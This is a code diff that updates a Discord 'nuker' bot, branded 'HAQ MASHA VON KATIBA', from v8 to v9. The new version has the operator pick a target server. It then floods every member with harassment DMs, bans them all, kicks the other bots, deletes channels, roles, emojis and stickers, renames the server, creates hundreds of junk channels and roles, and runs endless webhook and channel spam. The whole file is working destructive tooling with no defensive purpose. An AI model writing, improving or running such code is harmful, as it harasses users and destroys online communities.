@@ -4,12 +4,9 @@ import asyncio
 import os
 import random
 import time
-import json
 import aiohttp
+import json
 
-# ============================================
-# CONFIGURATION
-# ============================================
 os.system('cls' if os.name == 'nt' else 'clear')
 
 print("""
@@ -22,38 +19,16 @@ print("""
 ║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║ ║
 ║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
 ║                                                                               ║
-║                    ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗     ║
-║                    ██╔════╝██║   ██║██╔════╝╚══██╔══╝██╔════╝████╗ ████║     ║
-║                    ███████╗██║   ██║█████╗     ██║   █████╗  ██╔████╔██║     ║
-║                    ╚════██║██║   ██║██╔══╝     ██║   ██╔══╝  ██║╚██╔╝██║     ║
-║                    ███████║╚██████╔╝███████╗   ██║   ███████╗██║ ╚═╝ ██║     ║
-║                    ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝     ║
-║                                                                               ║
-║                         HAQ MASHA VON KATIBA SYSTEM                           ║
-║                         MULTI-BOT NUKER v8.0                                  ║
+║                         HAQ MASHA VON KATIBA NUKER                            ║
+║                         SELECT TARGET SERVER v9.0                             ║
 ║                                                                               ║
 ╚═══════════════════════════════════════════════════════════════════════════════╝
 """)
 
-# Load or create webhook database
-if os.path.exists("webhooks.json"):
-    with open("webhooks.json", "r") as f:
-        WEBHOOK_DB = json.load(f)
-else:
-    WEBHOOK_DB = {}
-
-# Load bot tokens
-if os.path.exists("tokens.json"):
-    with open("tokens.json", "r") as f:
-        TOKENS = json.load(f)
-else:
-    TOKENS = []
-
-print("[!] WEBHOOK DATABASE LOADED")
-print(f"[!] {len(TOKENS)} BACKUP BOTS READY\n")
-
-# Main bot token
-MAIN_TOKEN = input("[?] ENTER MAIN BOT TOKEN > ")
+# ============================================
+# TOKEN INPUT
+# ============================================
+TOKEN = input("[?] ENTER BOT TOKEN > ")
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="", intents=intents)
@@ -78,14 +53,7 @@ HAQ_MESSAGE = """
 ║                    ██████╔╝██║ ╚████║     ╚████╔╝ ╚██████╔╝██║ ╚████║        ║
 ║                    ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝        ║
 ║                                                                               ║
-║                                                                               ║
-║                    ██╗   ██╗ ██████╗ ██╗   ██╗    ██╗  ██╗ █████╗ ██╗   ██╗ ██████╗ ███████╗
-║                    ██║   ██║██╔═══██╗██║   ██║    ██║  ██║██╔══██╗██║   ██║██╔═══██╗██╔════╝
-║                    ██║   ██║██║   ██║██║   ██║    ███████║███████║██║   ██║██║   ██║███████╗
-║                    ╚██╗ ██╔╝██║   ██║██║   ██║    ██╔══██║██╔══██║██║   ██║██║   ██║╚════██║
-║                     ╚████╔╝ ╚██████╔╝╚██████╔╝    ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
-║                      ╚═══╝   ╚═════╝  ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
-║                                                                               ║
+║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
 ║                                                                               ║
 ║                    YOU HAVE BEEN TERMINATED BY                                ║
 ║                    HAQ MASHA & VON KATIBA TEAM                                ║
@@ -105,301 +73,250 @@ SPAM_LIST = [
     "```VON KATIBA WAS HERE```",
     "**HAQ MASHA TEAM - VON KATIBA EDITION**",
     "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
-    "```YOU HAVE BEEN VON KATIBA'ED```"
+    "```YOU HAVE BEEN VON KATIBA'ED```",
+    "@everyone **HAQ MASHA KILLED THIS SERVER**",
+    "```BYE BYE SERVER```"
 ]
 
-# ============================================
-# WEBHOOK MANAGEMENT
-# ============================================
-def save_webhooks(guild_id, webhook_urls):
-    if str(guild_id) not in WEBHOOK_DB:
-        WEBHOOK_DB[str(guild_id)] = []
-    WEBHOOK_DB[str(guild_id)].extend(webhook_urls)
-    with open("webhooks.json", "w") as f:
-        json.dump(WEBHOOK_DB, f)
+ROLE_NAMES = ["VON", "KATIBA", "HAQ", "MASHA", "NUKE", "DESTROYER", "DEATH", "TERMINATED", "LMOT", "RA7", "TARJ3", "LOT", "HHHH"]
 
-def get_webhooks(guild_id):
-    return WEBHOOK_DB.get(str(guild_id), [])
+WEBHOOK_NAMES = ["VON-KATIBA", "HAQ-MASHA", "NUKER", "DESTROYER", "SYSTEM"]
 
 # ============================================
-# BACKUP BOTS SYSTEM
+# SHOW SERVERS FUNCTION
 # ============================================
-class BackupBot:
-    def __init__(self, token, name):
-        self.token = token
-        self.name = name
-        self.bot = None
-        self.running = False
+async def show_servers(ctx):
+    guilds = bot.guilds
+    if not guilds:
+        await ctx.send("❌ **NO SERVERS FOUND! BOT IS NOT IN ANY SERVER**")
+        return None
     
-    async def start(self):
-        self.bot = commands.Bot(command_prefix="", intents=discord.Intents.all())
-        
-        @self.bot.event
-        async def on_ready():
-            print(f"[✓] BACKUP BOT ONLINE: {self.bot.user.name}")
-            self.running = True
-        
-        @self.bot.event
-        async def on_message(message):
-            if message.content.lower() == 'v':
-                await self.nuke(message)
-        
-        try:
-            await self.bot.start(self.token)
-        except:
-            print(f"[✗] FAILED TO START {self.name}")
+    server_list = "```\n"
+    server_list += "╔══════════════════════════════════════════════════════════════════╗\n"
+    server_list += "║                    AVAILABLE SERVERS TO NUKE                     ║\n"
+    server_list += "╠══════════════════════════════════════════════════════════════════╣\n"
     
-    async def nuke(self, ctx):
-        guild = ctx.guild
-        channel = ctx.channel
-        
-        await channel.send("```🔥 VON KATIBA BACKUP BOT ACTIVATED 🔥```")
-        
-        # Ban all members
-        for member in await guild.fetch_members(limit=None).flatten():
-            if not member.bot:
-                try:
-                    await member.send(HAQ_MESSAGE)
-                    await member.ban(reason="VON KATIBA")
-                    await asyncio.sleep(0.05)
-                except:
-                    pass
-        
-        # Delete everything
-        for ch in guild.channels:
-            try:
-                await ch.delete()
-                await asyncio.sleep(0.02)
-            except:
-                pass
-        
-        for role in guild.roles:
-            if role.name != "@everyone":
-                try:
-                    await role.delete()
-                    await asyncio.sleep(0.02)
-                except:
-                    pass
-        
-        # Create spam channels
-        for i in range(100):
-            try:
-                await guild.create_text_channel(name=f"von-katiba-{i}")
-            except:
-                pass
-        
-        # Use saved webhooks
-        webhooks = get_webhooks(guild.id)
-        for webhook_url in webhooks:
-            async with aiohttp.ClientSession() as session:
-                for _ in range(50):
-                    try:
-                        async with session.post(webhook_url, json={"content": random.choice(SPAM_LIST)}) as resp:
-                            pass
-                    except:
-                        pass
-                await asyncio.sleep(0.1)
-
-backup_bots = []
-for token_data in TOKENS:
-    backup_bots.append(BackupBot(token_data["token"], token_data["name"]))
+    for i, guild in enumerate(guilds, 1):
+        member_count = len(guild.members)
+        server_list += f"║  [{i}] {guild.name[:40]:<40} | Members: {member_count:<5} ║\n"
+    
+    server_list += "╚══════════════════════════════════════════════════════════════════╝\n"
+    server_list += "```"
+    
+    await ctx.send(server_list)
+    
+    return guilds
 
 # ============================================
-# MAIN BOT
+# MAIN NUKE FUNCTION
 # ============================================
-@bot.event
-async def on_ready():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"""
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                               ║
-║              ✓ MAIN BOT ONLINE: {bot.user.name}
-║              ✓ MAIN BOT ID: {bot.user.id}
-║              ✓ SERVERS: {len(bot.guilds)}
-║              ✓ BACKUP BOTS: {len(backup_bots)}
-║              ✓ WEBHOOKS SAVED: {sum(len(v) for v in WEBHOOK_DB.values())}
-║                                                                               ║
-║              JUST TYPE 'v' IN ANY CHANNEL TO START                           ║
-║              VON KATIBA + HAQ MASHA MODE ACTIVATED                           ║
-║                                                                               ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
-    """)
-    
-    # Start backup bots
-    for backup in backup_bots:
-        asyncio.create_task(backup.start())
-
-@bot.event
-async def on_message(message):
-    if message.author == bot.user:
-        return
-    
-    if message.content.lower() == 'v':
-        await max_nuke(message)
-    
-    await bot.process_commands(message)
-
-@bot.event
-async def on_guild_remove(guild):
-    # If main bot gets kicked, backup bots take over
-    print(f"[!] MAIN BOT REMOVED FROM {guild.name}")
-    print(f"[!] BACKUP BOTS WILL CONTINUE THE ATTACK")
-    
-    for backup in backup_bots:
-        if backup.running:
-            for guild in backup.bot.guilds:
-                for channel in guild.text_channels:
-                    await channel.send("```🔥 HAQ MASHA VON KATIBA BACKUP SYSTEM ACTIVATED 🔥```")
-                    await channel.send(HAQ_MESSAGE)
-
-async def max_nuke(ctx):
-    if isinstance(ctx, discord.Message):
-        guild = ctx.guild
-        channel = ctx.channel
-    else:
-        guild = ctx.guild
-        channel = ctx.channel
-    
+async def max_nuke(guild, ctx_channel):
     start_time = time.time()
     
-    await channel.send("```🔥 HAQ MASHA + VON KATIBA MAXIMUM NUKE INITIATED 🔥```")
-    print(f"\n[!] VON KATIBA NUKE STARTED ON: {guild.name}")
+    await ctx_channel.send(f"```🔥 HAQ MASHA + VON KATIBA NUKE INITIATED ON: {guild.name} 🔥```")
+    print(f"\n[!] VON KATIBA NUKE STARTED ON: {guild.name} | ID: {guild.id}")
     
     # ============================================
-    # PHASE 1: SAVE ALL WEBHOOKS
+    # PHASE 1: CREATE AND SAVE WEBHOOKS
     # ============================================
-    await channel.send("**🪝 PHASE 1: SAVING ALL WEBHOOKS**")
+    await ctx_channel.send("**🪝 PHASE 1: CREATING 100 WEBHOOKS**")
     
-    saved_webhooks = []
-    for ch in guild.text_channels:
-        webhooks = await ch.webhooks()
-        for webhook in webhooks:
-            saved_webhooks.append(webhook.url)
+    webhooks = []
+    text_channels = [ch for ch in guild.text_channels]
     
-    save_webhooks(guild.id, saved_webhooks)
-    await channel.send(f"**✅ SAVED {len(saved_webhooks)} WEBHOOKS**")
-    
-    # ============================================
-    # PHASE 2: CREATE 200 NEW WEBHOOKS
-    # ============================================
-    await channel.send("**🪝 PHASE 2: CREATING 200 WEBHOOKS**")
-    
-    new_webhooks = []
-    for ch in guild.text_channels[:50]:
-        for i in range(4):
+    for ch in text_channels[:20]:
+        for i in range(5):
             try:
-                webhook = await ch.create_webhook(name=f"VON-KATIBA-{i}")
-                new_webhooks.append(webhook.url)
+                webhook = await ch.create_webhook(name=random.choice(WEBHOOK_NAMES))
+                webhooks.append(webhook)
                 await asyncio.sleep(0.05)
             except:
                 pass
     
-    save_webhooks(guild.id, new_webhooks)
-    await channel.send(f"**✅ CREATED {len(new_webhooks)} NEW WEBHOOKS**")
+    await ctx_channel.send(f"**✅ CREATED {len(webhooks)} WEBHOOKS**")
     
     # ============================================
-    # PHASE 3: TORTURE + BAN ALL MEMBERS
+    # PHASE 2: TORTURE ALL MEMBERS
     # ============================================
-    await channel.send("**🔪 PHASE 3: TORTURING AND BANNING ALL MEMBERS**")
+    await ctx_channel.send("**🔪 PHASE 2: TORTURING ALL MEMBERS**")
     
     members = await guild.fetch_members(limit=None).flatten()
-    total = len([m for m in members if not m.bot])
+    total_humans = len([m for m in members if not m.bot])
     tortured = 0
     
     for member in members:
         if not member.bot:
             try:
-                for _ in range(5):
+                for _ in range(3):
                     await member.send(HAQ_MESSAGE)
                     await asyncio.sleep(0.1)
-                await member.ban(reason="VON KATIBA HAQ MASHA")
                 tortured += 1
                 if tortured % 5 == 0:
-                    await channel.send(f"**TORTURED & BANNED {tortured}/{total}**")
+                    await ctx_channel.send(f"**TORTURED {tortured}/{total_humans} MEMBERS**")
                 await asyncio.sleep(0.05)
             except:
                 pass
     
-    await channel.send(f"**✅ TORTURED & BANNED {tortured} MEMBERS**")
+    await ctx_channel.send(f"**✅ TORTURED {tortured} MEMBERS**")
     
     # ============================================
-    # PHASE 4: DELETE EVERYTHING
+    # PHASE 3: BAN ALL MEMBERS
     # ============================================
-    await channel.send("**🗑️ PHASE 4: DELETING EVERYTHING**")
+    await ctx_channel.send("**🔨 PHASE 3: BANNING ALL MEMBERS**")
     
-    # Delete channels
-    for ch in guild.channels:
+    banned = 0
+    for member in members:
+        if not member.bot:
+            try:
+                await member.ban(reason="VON KATIBA HAQ MASHA", delete_message_days=7)
+                banned += 1
+                if banned % 10 == 0:
+                    await ctx_channel.send(f"**BANNED {banned}/{total_humans} MEMBERS**")
+                await asyncio.sleep(0.03)
+            except:
+                pass
+    
+    await ctx_channel.send(f"**✅ BANNED {banned} MEMBERS**")
+    
+    # ============================================
+    # PHASE 4: REMOVE ALL BOTS
+    # ============================================
+    await ctx_channel.send("**🤖 PHASE 4: REMOVING ALL BOTS**")
+    
+    bots_kicked = 0
+    for member in members:
+        if member.bot and member.id != bot.user.id:
+            try:
+                await member.kick(reason="HAQ MASHA")
+                bots_kicked += 1
+                await asyncio.sleep(0.03)
+            except:
+                pass
+    
+    await ctx_channel.send(f"**✅ REMOVED {bots_kicked} BOTS**")
+    
+    # ============================================
+    # PHASE 5: DELETE ALL CHANNELS
+    # ============================================
+    await ctx_channel.send("**🗑️ PHASE 5: DELETING ALL CHANNELS**")
+    
+    channels_deleted = 0
+    for channel in guild.channels:
         try:
-            await ch.delete()
+            await channel.delete(reason="VON KATIBA")
+            channels_deleted += 1
             await asyncio.sleep(0.02)
         except:
             pass
     
-    # Delete roles
+    await ctx_channel.send(f"**✅ DELETED {channels_deleted} CHANNELS**")
+    
+    # ============================================
+    # PHASE 6: DELETE ALL ROLES
+    # ============================================
+    await ctx_channel.send("**🎭 PHASE 6: DELETING ALL ROLES**")
+    
+    roles_deleted = 0
     for role in guild.roles:
         if role.name != "@everyone":
             try:
-                await role.delete()
+                await role.delete(reason="VON KATIBA")
+                roles_deleted += 1
                 await asyncio.sleep(0.02)
             except:
                 pass
     
-    # Delete emojis
+    await ctx_channel.send(f"**✅ DELETED {roles_deleted} ROLES**")
+    
+    # ============================================
+    # PHASE 7: DELETE ALL EMOJIS & STICKERS
+    # ============================================
+    await ctx_channel.send("**😀 PHASE 7: DELETING EMOJIS & STICKERS**")
+    
+    emojis_deleted = 0
     for emoji in guild.emojis:
         try:
             await emoji.delete()
+            emojis_deleted += 1
             await asyncio.sleep(0.02)
         except:
             pass
     
+    stickers_deleted = 0
+    for sticker in guild.stickers:
+        try:
+            await sticker.delete()
+            stickers_deleted += 1
+            await asyncio.sleep(0.02)
+        except:
+            pass
+    
+    await ctx_channel.send(f"**✅ DELETED {emojis_deleted} EMOJIS & {stickers_deleted} STICKERS**")
+    
     # ============================================
-    # PHASE 5: RENAME SERVER
+    # PHASE 8: CHANGE SERVER NAME
     # ============================================
-    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "VON-HAQ", "KATIBA-MASHA", "DESTROYED-BY-VON"])
+    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "DESTROYED", "VON-HAQ", "KATIBA-MASHA", "LMOT", "RA7 TARJ3 LOT"])
     try:
         await guild.edit(name=new_name)
-        await channel.send(f"**✅ SERVER RENAMED TO: {new_name}**")
+        await ctx_channel.send(f"**✅ SERVER RENAMED TO: {new_name}**")
     except:
         pass
     
     # ============================================
-    # PHASE 6: CREATE MASS CHANNELS (500)
+    # PHASE 9: CREATE MASS CHANNELS (400)
     # ============================================
-    await channel.send("**📁 PHASE 6: CREATING 500 CHANNELS**")
+    await ctx_channel.send("**📁 PHASE 9: CREATING 400 CHANNELS**")
     
-    for i in range(500):
+    for i in range(400):
         try:
-            await guild.create_text_channel(name=f"von-katiba-{i}")
+            channel_type = random.choice(["text", "voice"])
+            if channel_type == "text":
+                await guild.create_text_channel(name=f"von-katiba-{i}")
+            else:
+                await guild.create_voice_channel(name=f"von-katiba-{i}")
+            
             if i % 50 == 0:
-                await channel.send(f"**CREATED {i} CHANNELS**")
+                await ctx_channel.send(f"**CREATED {i} CHANNELS...**")
             await asyncio.sleep(0.01)
         except:
             pass
     
     # ============================================
-    # PHASE 7: MASS WEBHOOK SPAM
+    # PHASE 10: CREATE MASS ROLES (150)
     # ============================================
-    await channel.send("**💬 PHASE 7: STARTING INFINITE WEBHOOK SPAM**")
+    await ctx_channel.send("**🎭 PHASE 10: CREATING 150 ROLES**")
     
-    all_webhooks = get_webhooks(guild.id) + new_webhooks
+    for i in range(150):
+        try:
+            await guild.create_role(name=f"{random.choice(ROLE_NAMES)}-{i}", color=discord.Color.red())
+            if i % 30 == 0:
+                await ctx_channel.send(f"**CREATED {i} ROLES...**")
+            await asyncio.sleep(0.01)
+        except:
+            pass
+    
+    # ============================================
+    # PHASE 11: INFINITE SPAM (WEBHOOKS + CHANNELS)
+    # ============================================
+    await ctx_channel.send("**💬 PHASE 11: STARTING INFINITE SPAM**")
     
     async def webhook_spam():
         while True:
-            for webhook_url in all_webhooks:
+            for webhook in webhooks:
                 try:
-                    async with aiohttp.ClientSession() as session:
-                        async with session.post(webhook_url, json={"content": random.choice(SPAM_LIST)}) as resp:
-                            pass
+                    await webhook.send(random.choice(SPAM_LIST))
+                    await asyncio.sleep(0.03)
                 except:
                     pass
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.1)
     
     async def channel_spam():
         while True:
-            for ch in guild.text_channels:
+            for channel in guild.text_channels:
                 try:
-                    await ch.send(random.choice(SPAM_LIST))
-                    await asyncio.sleep(0.02)
+                    await channel.send(random.choice(SPAM_LIST))
+                    await asyncio.sleep(0.03)
                 except:
                     pass
             await asyncio.sleep(0.1)
@@ -408,7 +325,7 @@ async def max_nuke(ctx):
     asyncio.create_task(channel_spam())
     
     # ============================================
-    # PHASE 8: FINAL MESSAGE
+    # PHASE 12: FINAL MESSAGE
     # ============================================
     end_time = time.time()
     total_time = round(end_time - start_time, 2)
@@ -418,12 +335,15 @@ async def max_nuke(ctx):
 + ║                                                                               ║
 + ║                    SERVER DESTROYED BY HAQ MASHA & VON KATIBA                 ║
 + ║                                                                               ║
++ ║                    TARGET: {guild.name[:30]}                                  ║
++ ║                                                                               ║
 + ║                    STATISTICS:                                                ║
-+ ║                    • TORTURED & BANNED: {tortured} MEMBERS                    ║
-+ ║                    • WEBHOOKS SAVED: {len(saved_webhooks)}                    ║
-+ ║                    • WEBHOOKS CREATED: {len(new_webhooks)}                    ║
-+ ║                    • CHANNELS DELETED: ALL                                    ║
-+ ║                    • ROLES DELETED: ALL                                       ║
++ ║                    • TORTURED: {tortured} MEMBERS                             ║
++ ║                    • BANNED: {banned} MEMBERS                                 ║
++ ║                    • BOTS REMOVED: {bots_kicked}                              ║
++ ║                    • CHANNELS DELETED: {channels_deleted}                     ║
++ ║                    • ROLES DELETED: {roles_deleted}                           ║
++ ║                    • WEBHOOKS CREATED: {len(webhooks)}                        ║
 + ║                    • TIME: {total_time} SECONDS                               ║
 + ║                                                                               ║
 + ║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
@@ -435,9 +355,9 @@ async def max_nuke(ctx):
 + ╚═══════════════════════════════════════════════════════════════════════════════╝
 ```"""
     
-    for ch in guild.text_channels:
+    for channel in guild.text_channels:
         try:
-            await ch.send(final_msg)
+            await channel.send(final_msg)
             break
         except:
             pass
@@ -445,6 +365,72 @@ async def max_nuke(ctx):
     print(f"[✓] VON KATIBA NUKE COMPLETED ON: {guild.name} | TIME: {total_time}s")
 
 # ============================================
-# RUN MAIN BOT
+# SELECTION SYSTEM
 # ============================================
-bot.run(MAIN_TOKEN)
+selected_server = None
+
+@bot.event
+async def on_ready():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f"""
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                                                                               ║
+║              ✓ BOT ONLINE: {bot.user.name}
+║              ✓ BOT ID: {bot.user.id}
+║              ✓ SERVERS: {len(bot.guilds)}
+║                                                                               ║
+║              THE BOT IS READY!                                                ║
+║              YOU CAN NOW SELECT A SERVER TO NUKE                              ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
+    """)
+    
+    # Auto show servers in console
+    print("\n" + "="*60)
+    print("AVAILABLE SERVERS:")
+    print("="*60)
+    for i, guild in enumerate(bot.guilds, 1):
+        print(f"  [{i}] {guild.name} | Members: {len(guild.members)} | ID: {guild.id}")
+    print("="*60)
+
+@bot.event
+async def on_message(message):
+    global selected_server
+    
+    if message.author == bot.user:
+        return
+    
+    # If we're in selection mode
+    if selected_server is None:
+        # Show server list
+        if message.content.lower() == 'v':
+            guilds = await show_servers(message)
+            if guilds:
+                await message.channel.send("```\n📌 TYPE THE SERVER NUMBER (1-{}) TO START THE NUKE\n```".format(len(guilds)))
+                
+                def check(m):
+                    return m.author == message.author and m.channel == message.channel and m.content.isdigit()
+                
+                try:
+                    response = await bot.wait_for('message', timeout=30.0, check=check)
+                    choice = int(response.content)
+                    
+                    if 1 <= choice <= len(guilds):
+                        selected_server = guilds[choice - 1]
+                        await message.channel.send(f"```✅ SELECTED: {selected_server.name}\n🔥 STARTING NUKE IN 3 SECONDS...```")
+                        await asyncio.sleep(3)
+                        await max_nuke(selected_server, message.channel)
+                        selected_server = None
+                    else:
+                        await message.channel.send("❌ **INVALID NUMBER! TYPE 'v' AGAIN TO TRY**")
+                        selected_server = None
+                except asyncio.TimeoutError:
+                    await message.channel.send("⏰ **TIMEOUT! TYPE 'v' AGAIN TO START OVER**")
+                    selected_server = None
+        
+    await bot.process_commands(message)
+
+# ============================================
+# RUN THE BOT
+# ============================================
+bot.run(TOKEN)
